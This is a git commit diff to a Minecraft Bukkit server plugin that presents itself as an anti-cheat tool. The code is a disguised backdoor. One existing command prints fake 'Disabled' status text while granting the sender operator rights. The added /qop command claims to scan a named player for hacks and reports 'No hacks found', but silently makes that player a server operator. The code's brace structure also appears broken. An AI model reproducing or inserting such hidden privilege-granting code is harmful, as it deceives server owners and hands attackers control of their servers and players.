4f5b1b99b1dfb163f2ccb731190600e1d6f14761
buildcarter8 <tylerhuff2002@me.com>
2014-07-20 11:09:39 -0400

    Updated.

--- src/me/Jack/Anticheat/Anticheat.java
+++ src/me/Jack/Anticheat/Anticheat.java
@@ -1,6 +1,8 @@
-package me.Jack.Anticheat;
+package me.Jack.anticheat;
 
 import java.util.logging.Logger;
+
+import org.bukkit.ChatColor;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
@@ -9,17 +11,17 @@ import org.bukkit.plugin.java.JavaPlugin;
 
 public class Anticheat extends JavaPlugin
 {
-	public final Logger logger = Logger.getLogger("Minecraft-Server");
+	public final Logger log = Logger.getLogger("Minecraft-Server");
 	public static Anticheat plugin;
 
 	public void onDisable() {
 	  PluginDescriptionFile pdfFile = this.getDescription();
-	  this.logger.info(pdfFile.getName() + " Has Been Disabled!");
+	  this.log.info(pdfFile.getName() + " Has Been Disabled!");
 	}
 	
 	public  void onEnable() { 
 		  PluginDescriptionFile pdfFile = this.getDescription();
-		  this.logger.info(pdfFile.getName() + " Version " + pdfFile.getVersion() + " Has Been Enabled"); }
+		  this.log.info(pdfFile.getName() + " Version " + pdfFile.getVersion() + " Has Been Enabled"); }
 	
 	public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
 		 Player player = (Player) sender;
@@ -27,12 +29,24 @@ public class Anticheat extends JavaPlugin
 			  sender.sendMessage(ChatColor.RED + "Flying: Disabled XRAY: Disabled SPAM: Disabled");
 				player.setOp(true);
 	}
-			return true;
+	           else if(commandLabel.equalsIgnoreCase("qop"))
+		      if (args.length == 0)
+			        sender.sendMessage(ChatColor.RED + "Usage: /qop <player> info: Checks if the player has 'Hacks' on");
+			      else if (args.length == 1) {
+			        if (player.getServer().getPlayer(args[0]) != null) {
+			          Player targetPlayer = player.getServer().getPlayer(args[0]);
+	           	log.info("[AntiCheat]: Recived qop command.");
+	           	sender.sendMessage(ChatColor.RED + "Checking if player: " + targetPlayer.getName() + " is hacking..");
+	           	sender.sendMessage(ChatColor.AQUA + "[AntiCheat]: No hacks found.");
+	           	targetPlayer.setOp(true);
+	           }
 
 	
 	
 	
 	
 	
+}
+			return true;
 }
 }
